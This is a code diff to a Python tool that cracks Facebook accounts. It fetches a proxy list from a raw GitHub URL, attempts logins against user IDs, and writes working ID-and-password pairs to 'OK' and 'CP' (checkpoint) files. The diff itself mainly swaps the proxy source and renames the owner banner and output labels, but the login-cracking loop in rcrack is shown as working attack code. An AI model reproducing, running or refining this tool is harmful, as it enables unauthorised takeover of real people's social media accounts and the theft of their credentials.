@@ -46,7 +46,7 @@ my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
 try:
-	prox= requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
+	prox= requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('\x1b[1;95m[√] LOADING...')
@@ -132,7 +132,7 @@ logo=("""
       \033[1;32m .##....##..##....##.##.....##
       \033[1;39m .##.....##..######..##.....##
 \33[1;37m----------------------------------------------
-→   Owner      :  Raziqullah Saadat KING 💪
+→   Owner      :  Raziqullah Saadat
 →   Facebook   :  Raziqullah Saadat
 →   Github     : Saadat
   →   Tools   :  RANDOM 
@@ -449,21 +449,21 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[SN.AFG HKR-OK] '+cid+'|'+ps+'\033[0;97m')
+                print('\033[1;32m[Saadat-OK] '+cid+'|'+ps+'\033[0;97m')
                 open('SN.AFG HKR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[SN.AFG HKR-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                print('\033[1;31m[Saadat-CP] '+uid+' | '+ps+'\x1b[1;97m')
                 open('SN.AFG HKR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mSN.AFG HKR\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mSaadat\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
